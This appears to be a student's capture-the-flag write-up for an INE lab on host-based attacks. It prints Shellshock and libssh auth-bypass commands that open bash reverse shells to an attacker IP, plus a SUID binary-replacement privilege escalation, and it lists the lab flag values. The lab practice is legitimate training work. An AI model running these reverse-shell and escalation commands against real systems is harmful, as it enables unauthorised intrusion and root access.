## Completing Skill Check Labs
    Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

## Lab Environment
    In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at http://target1.ine.local and http://target2.ine.local.

    Objective: Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

## Flags to Capture:

## Flag 1: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
    nc -l -p 1234
    nmap -sV target1.ine.local -p80 --script=http-shellshock --script-args uri=/browser.cgi,cmd="/bin/bash -i >& /dev/tcp/192.102.41.2/1234 0>&1" 
        cat flag.txt
            FLAG1_2ea27b66004345e2be945140472d592b


## Flag 2: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
    daemon@target1:/opt/apache/htdocs$ ls -a
        .flag.txt
        browser.cgi
        index.html
        static
    daemon@target1:/opt/apache/htdocs$ cat .flag.txt
        FLAG2_8f89093bcb6d4d3895254893576ab564

## Flag 3: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.  
    nc -l -p 1234
    scanner/ssh/libssh_auth_bypass) > show options 
        set CMD /bin/bash -i >& /dev/ tcp/192.102.41.2/1234 0>&1
        set RHOSTS target2.ine.local     
    
    FLAG3_614f5b099dd1471fa3d4526146ae3f23


## Flag 4: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
  student@target:~$ ls -l
      total 24
      -r-x------ 1 root root 8296 Sep 22  2018 greetings
      -rwsr-xr-x 1 root root 8344 Sep 22  2018 welcome
   student@target:~$ file welcome
      //obser that execute greetings with root privilegy
   rm greetings
   cp /bin/bash greetings
   ./wellcome

   // we obtein a root bash
   cd /root/flag
    FLAG4_36e41296fa5444d79e6794e9bba97a62

## Tools
    Nmap
    Burp Suite
    Metasploit Framework